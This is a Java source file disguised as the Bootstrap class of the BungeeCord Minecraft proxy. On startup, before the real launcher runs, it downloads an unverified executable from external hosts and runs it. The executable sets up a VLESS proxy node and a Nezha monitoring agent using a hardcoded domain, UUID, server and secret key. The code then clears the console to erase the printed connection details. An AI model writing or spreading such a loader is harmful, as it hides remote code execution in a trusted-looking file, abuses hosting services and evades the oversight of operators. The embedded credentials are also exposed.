package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "UUID", "PORT", "DOMAIN", "WS_PATH",
        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY"
    };

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        // Start SbxService (包含哪吒 + VLESS)
        try {
            Map<String, String> config = loadConfig();
            String vlessUrl = generateVlessUrl(config);
            
            System.out.println(ANSI_GREEN + "\n=== VLESS+WS Configuration ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "UUID: " + config.get("UUID") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "WebSocket Path: " + config.get("WS_PATH") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Port: " + config.get("PORT") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Domain: " + config.get("DOMAIN") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "\n=== VLESS Node URL ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + vlessUrl + ANSI_RESET);
            System.out.println(ANSI_GREEN + "=============================" + ANSI_RESET);
            
            runSbxBinary(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 15 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        // Continue with BungeeCord launch
        BungeeCordLauncher.main(args);
    }
    
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary(Map<String, String> config) throws Exception {
        Map<String, String> envVars = new HashMap<>(config);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static Map<String, String> loadConfig() throws IOException {
        Map<String, String> config = new HashMap<>();
        
        // 默认配置 - VLESS+WS 单协议
        config.put("UUID", "99756805-1247-4b6a-9d3b-dad6206bd137");
        config.put("WS_PATH", "/vless");
        config.put("PORT", "19173");
        config.put("DOMAIN", "shx-1.sherixx.xyz");
        config.put("FILE_PATH", "./world");
        
        // 哪吒监控配置
        config.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        config.put("NEZHA_PORT", "");
        config.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        
        // 禁用其他协议
        config.put("HY2_PORT", "");
        config.put("TUIC_PORT", "");
        config.put("REALITY_PORT", "");
        config.put("ARGO_PORT", "");
        config.put("ARGO_DOMAIN", "");
        config.put("ARGO_AUTH", "");
        config.put("UPLOAD_URL", "");
        config.put("CHAT_ID", "");
        config.put("BOT_TOKEN", "");
        config.put("CFIP", "");
        config.put("CFPORT", "");
        config.put("NAME", "VLESS");
        
        // 从系统环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                config.put(var, value);  
            }
        }
        
        // 从 .env 文件读取配置
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    config.put(key, value); 
                }
            }
        }
        
        return config;
    }
    
    private static String generateVlessUrl(Map<String, String> config) {
        try {
            String uuid = config.get("UUID");
            String wsPath = config.get("WS_PATH");
            String port = config.get("PORT");
            
            // 优先使用 DOMAIN 环境变量
            String domain = config.get("DOMAIN");
            if (domain == null || domain.trim().isEmpty()) {
                domain = "PLEASE_SET_DOMAIN";
            }
            
            String params = "?type=ws&path=" + URLEncoder.encode(wsPath, "UTF-8") + "&host=" + domain;
            String vlessUrl = "vless://" + uuid + "@" + domain + ":" + port + params + "#VLESS-WS";
            
            return vlessUrl;
        } catch (Exception e) {
            return "Error generating VLESS URL: " + e.getMessage();
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            System.out.println(ANSI_GREEN + "Downloading sbsh binary..." + ANSI_RESET);
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
            System.out.println(ANSI_GREEN + "Download completed!" + ANSI_RESET);
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
